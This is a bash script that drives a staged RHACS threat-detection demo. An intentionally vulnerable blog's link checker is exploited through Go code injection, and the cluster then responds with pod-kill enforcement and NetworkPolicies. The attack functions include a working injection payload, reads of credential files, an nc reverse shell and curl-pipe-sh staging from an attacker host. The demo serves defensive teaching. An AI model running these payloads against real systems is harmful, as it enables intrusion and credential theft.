#!/usr/bin/env bash
# demo.sh — drive "The Unhackable Blog" (RHACS Threat Detection & Response).
#
#   demo.sh status     where are we? (images, CVEs, enforcement, active violations)
#   demo.sh act1       Unhackable       0 CVEs, minimal risk, every policy green
#   demo.sh act2       Day zero         the "Check links" feature → remote code execution
#   demo.sh act3       Loot             credentials hunt, honeytoken, lateral movement
#   demo.sh c2         (2nd terminal)   attacker's reverse-shell listener (on this laptop)
#   demo.sh act4       Persistence      reverse shell + crypto miner
#   demo.sh act5       Respond          RHACS kills the pod, NetworkPolicy contains it
#   demo.sh act6       Fix forward      ship v2, exploit is dead, still 0 CVEs
#   demo.sh enforce    turn on Kill Pod for the TDR policies       (live mode, step 1)
#   demo.sh contain    apply the containment NetworkPolicies       (live mode, step 2)
#   demo.sh fix        roll out v2 (the fixed link checker)
#   demo.sh pwn CMD    run any command through the vulnerability
#   demo.sh reset      back to the start (v1, no enforcement, alerts resolved)
#   demo.sh resolve    resolve all demo violations
set -euo pipefail
source "$(dirname "$0")/lib/common.sh"
use_crc
load_rhacs

BLOG_HOST=$(oc get route blog -n "$APP_NS" -o jsonpath='{.spec.host}' 2>/dev/null || true)
CENTRAL=https://${ROX_ENDPOINT%:443}
ENFORCED_POLICIES=(tdr-unauthorized-process tdr-reverse-shell tdr-crypto-miner tdr-file-drift)

# ---------------------------------------------------------------- presentation helpers
banner() { printf '\n%s%s━━━ %s ━━━%s\n' "$B" "$MAG" "$*" "$N"; }
say()    { printf '%s  💬 %s%s\n' "$CYN" "$*" "$N"; }
show()   { printf '%s  👉 %s%s\n' "$YLW" "$*" "$N"; }
pause()  { [[ -t 0 && -z ${NO_PAUSE:-} ]] && { read -rsp $'\e[2m  [enter]\e[0m' _ ; echo; } || true; }

# POST a Go "rule" to the link-checker's rule engine (yaegi) and print what it returns.
_rule_post() {  # $1 = Go expression
  local body; body=$(jq -cn --arg r "$1" '{urls:[$r]}')
  curl -sk --max-time 20 -XPOST "https://$BLOG_HOST/api/links/check" -H 'Content-Type: application/json' -d "$body" |
    jq -r '.results[0].detail // .error // empty' 2>/dev/null | sed 's/^/  /' | grep . || echo "  (no output)"
}

# Run a shell command on the host via the rule engine. The app evaluates untrusted input as Go
# (CWE-94) — the app never shells out; the interpreter runs exec.Command on our behalf. The
# command is base64'd so any characters pass through the Go string literal cleanly.
pwn() {
  local cmd=$1
  printf '\n%s%sattacker@internet%s:%s~%s$ %s%s\n' "$B" "$RED" "$N" "$BLU" "$N" "$cmd" "$N"
  local b64; b64=$(printf '%s' "$cmd" | base64 | tr -d '\n')
  _rule_post "(func() string { c, _ := base64.StdEncoding.DecodeString(\"$b64\"); out, _ := exec.Command(\"sh\", \"-c\", string(c)).Output(); return string(out) })()"
}

# Advanced payload: a raw Go rule that runs IN-PROCESS — no child process at all (e.g. the
# compromised app pivots over the network itself). $1 = label to show, $2 = Go expression.
rule() {
  printf '\n%s%sattacker@internet%s:%s~%s$ %s%s\n' "$B" "$RED" "$N" "$BLU" "$N" "$1" "$N"
  _rule_post "$2"
}

blog_pod() { oc get pod -n "$APP_NS" -l app=blog --field-selector=status.phase=Running -o jsonpath='{.items[*].metadata.name}' 2>/dev/null | awk '{print $1}' || true; }

active_alerts() { # [ns]
  rox GET "/v1/alerts?query=$(uri "Namespace:${1:-$APP_NS}+Violation State:Active")&pagination.limit=200" |
    jq -r '.alerts[]? | "\(.policy.severity|sub("_SEVERITY";"")|ascii_downcase)\t\(.policy.name)"' | sort | uniq -c | sort -rn
}

image_summary() { # tag
  local img="$REGISTRY_SVC/$APP_NS/blog:$1" out
  out=$(roxctl -e "$ROX_ENDPOINT" image scan --image "$img" --output json 2>&1) || {
    grep -q "matcher is not initialized" <<<"$out" && echo "  image   Scanner V4 is still loading its vulnerability database — try again in a few minutes" || echo "  image   scan failed"; return; }
  jq -r '"  image   \(.result.summary // {} | "CVEs: \(.TOTAL_VULNERABILITIES // 0)  (critical \(.CRITICAL // 0), important \(.IMPORTANT // 0), moderate \(.MODERATE // 0), low \(.LOW // 0))")"' <<<"$out" 2>/dev/null \
    || jq -r '"  image   components: \(.result.components // [] | length)  vulns: \([.result.vulnerabilities[]?] | length)"' <<<"$out"
}

set_enforcement() { # on|off
  local actions='[]'; [[ $1 == on ]] && actions='["KILL_POD_ENFORCEMENT"]'
  for p in "${ENFORCED_POLICIES[@]}"; do
    oc get securitypolicy "$p" -n stackrox >/dev/null 2>&1 || continue
    oc patch securitypolicy "$p" -n stackrox --type merge -p "{\"spec\":{\"enforcementActions\":$actions}}" >/dev/null
  done
}

resolve_all() {
  local n=0 id
  for ns in "$APP_NS" "$PAY_NS"; do
    for id in $(rox GET "/v1/alerts?query=$(uri "Namespace:$ns+Violation State:Active")&pagination.limit=500" | jq -r '.alerts[]?.id'); do
      rox PATCH "/v1/alerts/$id/resolve" '{"whitelist":false}' >/dev/null && n=$((n+1))
    done
  done
  ok "resolved $n violation(s)"
}

links() {
  show "Blog:        https://$BLOG_HOST"
  show "Violations:  $CENTRAL/main/violations?s[Namespace]=$APP_NS"
  show "Risk:        $CENTRAL/main/risk?s[Namespace]=$APP_NS"
  show "Network:     $CENTRAL/main/network-graph?s[Cluster]=$CLUSTER_NAME&s[Namespace]=$APP_NS&s[Namespace]=$PAY_NS"
  show "Attacker:    $ATTACKER — this laptop, outside the cluster (scripts/attacker.sh status)"
}

# ---------------------------------------------------------------- acts
act1() {
  banner "ACT 1 — Unhackable"
  image_summary v1
  printf '  deploy  '; oc get deploy blog -n "$APP_NS" -o json | jq -r '.spec.template.spec | "SA token: \(.automountServiceAccountToken)  readOnlyRootFS: \(.containers[0].securityContext.readOnlyRootFilesystem)  caps dropped: \(.containers[0].securityContext.capabilities.drop|join(","))"'
  printf '  policy  '; roxctl -e "$ROX_ENDPOINT" deployment check --file "$TDR_DIR/deploy/app/blog.yaml" --output json 2>/dev/null |
    jq -r '"deploy-time violations: \([.results[]?.violatedPolicies[]?] | length)"' || echo "check unavailable"
  echo "  runtime active violations:"; active_alerts | sed 's/^/    /'; [[ -z $(active_alerts) ]] && echo "    none"
  links
}

act2() {
  banner "ACT 2 — Day zero"
  pwn "id"
  pwn "uname -a"
  pwn "cat /etc/os-release | head -2"
}

act3() {
  banner "ACT 3 — Living off the land: loot"
  pwn "ls /var/run/secrets/kubernetes.io/serviceaccount 2>&1"
  pwn "env | grep -ciE 'pass|token|secret|key' || true"
  pwn "cat ~/.aws/credentials"
  pwn "cat /opt/blog/.env"
  pause
  pwn "curl -sk --max-time 3 https://kubernetes.default.svc/version | head -5"
  pwn "curl -s --max-time 3 http://payments-api.payments.svc:8080/api/v1/cards"
}

c2() { exec "$TDR_DIR/scripts/attacker.sh" c2; }

act4() {
  banner "ACT 4 — Persistence and profit"
  info "needs the C2 listener: scripts/attacker.sh c2  (or pane 2 in make live)"
  pause
  pwn "nohup nc $ATTACKER 4444 -e /bin/sh >/dev/null 2>&1 & echo '[+] reverse shell launched'"
  pause
  pwn "curl -s http://$ATTACKER:8080/stage.sh | sh"
  sleep 3
  pwn "ps -o pid,args | grep -v ' ps '"
}

act5() {
  banner "ACT 5 — Respond: shrink the blast radius, then close the door"
  # ---- step 1: immediate containment — RHACS kills any off-baseline pod
  set_enforcement on
  ok "KILL_POD enforcement ON: ${ENFORCED_POLICIES[*]}"
  sleep 15   # let Central push the policy change to Sensor
  pause
  local before; before=$(blog_pod)
  pwn "id"
  local t=$SECONDS after=""
  while (( SECONDS - t < 30 )); do after=$(blog_pod); [[ -n $after && $after != "$before" ]] && break; sleep 1; done
  if [[ $after != "$before" ]]; then ok "pod $before KILLED by RHACS in seconds → replaced by clean $after"; else warn "pod not replaced yet — check RHACS violations"; fi
  oc rollout status deploy/blog -n "$APP_NS" --timeout=60s >/dev/null 2>&1; sleep 3
  pause
  # ---- step 2: network enforcement — blog gets DNS + internet on 80/443 only
  local cidrs; cidrs=$(oc get network.config cluster -o json | jq -r '[.spec.clusterNetwork[].cidr, .spec.serviceNetwork[]] | map("\"" + . + "\"") | join(", ")')
  sed "s|__CLUSTER_CIDRS__|$cidrs|" "$TDR_DIR/deploy/response/networkpolicies.yaml.tpl" | oc apply -f - >/dev/null
  ok "NetworkPolicies applied: tdr-blog-contain, tdr-payments-deny-all"
  sleep 5
  rule "fetch http://$ATTACKER:8080/stage.sh from inside the app itself (no shell, no new process)" \
    "(func() string { c := &http.Client{Timeout: 5*time.Second}; r, e := c.Get(\"http://$ATTACKER:8080/stage.sh\"); if e != nil { return \"blocked: \" + e.Error() }; defer r.Body.Close(); return r.Status })()"
}

act6() {
  banner "ACT 6 — Fix forward"
  oc set image deploy/blog -n "$APP_NS" blog="$REGISTRY_SVC/$APP_NS/blog:v2" >/dev/null
  oc rollout status deploy/blog -n "$APP_NS" --timeout=120s >/dev/null && ok "blog v2 rolled out"
  image_summary v2
  pwn "id"
}

enforce() {
  set_enforcement on
  ok "KILL_POD enforcement ON: ${ENFORCED_POLICIES[*]}"
  info "takes ~15 s to reach the cluster — then any process outside the baseline kills the pod"
}

contain() {
  local cidrs; cidrs=$(oc get network.config cluster -o json | jq -r '[.spec.clusterNetwork[].cidr, .spec.serviceNetwork[]] | map("\"" + . + "\"") | join(", ")')
  sed "s|__CLUSTER_CIDRS__|$cidrs|" "$TDR_DIR/deploy/response/networkpolicies.yaml.tpl" | oc apply -f - >/dev/null
  ok "NetworkPolicies applied: blog → DNS + internet on 80/443 only; payments-api accepts nothing"
}

fix() {
  oc set image deploy/blog -n "$APP_NS" blog="$REGISTRY_SVC/$APP_NS/blog:v2" >/dev/null
  oc rollout status deploy/blog -n "$APP_NS" --timeout=120s >/dev/null && ok "blog v2 rolled out (no shell, native HTTP client)"
}

status() {
  banner "Status"
  printf '  blog image   %s\n' "$(oc get deploy blog -n "$APP_NS" -o jsonpath='{.spec.template.spec.containers[0].image}' | sed 's|.*/||')"
  printf '  blog pod     %s\n' "$(blog_pod)"
  printf '  enforcement  %s\n' "$(oc get securitypolicy tdr-unauthorized-process -n stackrox -o jsonpath='{.spec.enforcementActions}' 2>/dev/null)"
  printf '  netpols      %s\n' "$(oc get networkpolicy -A -l tdr-demo=response --no-headers 2>/dev/null | awk '{print $2}' | paste -sd' ')"
  echo "  active violations ($APP_NS):"; active_alerts | sed 's/^/    /'
  links
}

# Recreate the blog so RHACS gives it a NEW deployment id, then declare + lock its baselines.
# A fresh id = fresh identity with EMPTY process history, so every run's attacks are "new":
# RHACS dedupes repeated (process, args) within a deployment's history, so an in-place restart
# would silently swallow the second run of the same command. Delete + recreate avoids that —
# exactly what fresh_payments does for payments-api.
#
# The "Unexpected Process Executed" policy only evaluates once the process baseline is LOCKED;
# while unlocked, RHACS stays in observation mode and raises nothing. The link checker validates
# URLs natively (Go net/http) and evaluates rules IN-PROCESS (yaegi), so the blog spawns NO
# child process at all — the baseline is a single binary. Anything else is, by definition, an
# attack. Declare it exactly, then lock process + network baselines.
BLOG_BASELINE=(/usr/local/bin/blog)
fresh_blog() {
  # shellcheck disable=SC1091
  source "$TDR_DIR/scripts/lib/rhacs-baselines.sh"
  oc delete -f "$TDR_DIR/deploy/app/blog.yaml" --ignore-not-found --wait=true >/dev/null 2>&1 || true
  oc apply  -f "$TDR_DIR/deploy/app/blog.yaml" >/dev/null
  oc rollout status deploy/blog -n "$APP_NS" --timeout=300s >/dev/null && ok "blog v1, fresh deployment"
  # Wait until RHACS has processed the NEW deployment (its network baseline exists) before we
  # address it — otherwise we might lock the old, about-to-disappear identity.
  _blog_seen() { local id; id=$(rox_deployment_id "$APP_NS" blog); [[ -n $id ]] && rox GET "/v1/networkbaseline/$id" | jq -e .deploymentId >/dev/null 2>&1; }
  wait_for "RHACS sees the new blog" 300 _blog_seen
  rhacs-pb-replace "$APP_NS/blog" blog "${BLOG_BASELINE[@]}" >/dev/null
  rhacs-pb-lock    "$APP_NS/blog"                            >/dev/null
  # The blog is exposed through the OpenShift route, so its one legitimate network peer is the
  # router's ingress on 8080. Declare it (don't lock an EMPTY baseline), so the network graph
  # shows router → blog as expected and only the attack's flows (→ payments, → kube API, → C2)
  # stand out as anomalous. Egress is unbounded by design — the blog is a link checker — so it
  # isn't baselined; this is for a truthful graph, not a detection surface (no policy evaluates
  # the blog's network baseline; lateral movement is caught on payments-api's side).
  rhacs-nb-add  "$APP_NS/blog" --peer openshift-ingress/router-default --port 8080 --ingress >/dev/null
  rhacs-nb-lock "$APP_NS/blog"                               >/dev/null
  ok "blog: process baseline LOCKED (${BLOG_BASELINE[*]}); network baseline = router ingress :8080, LOCKED"
}

reset() {
  banner "Reset"
  set_enforcement off;                                   ok "enforcement off"
  oc delete networkpolicy -A -l tdr-demo=response --ignore-not-found >/dev/null; ok "response NetworkPolicies removed"
  fresh_blog
  fresh_payments
  sleep 10
  resolve_all
}

case "${1:-}" in
  act1|act2|act3|act4|act5|act6|c2|status|reset|enforce|contain|fix) "$1" ;;
  resolve) resolve_all ;;
  pwn) shift; pwn "$*" ;;
  *) sed -n '2,19p' "$0" | sed 's/^# \{0,1\}//'; exit 1 ;;
esac
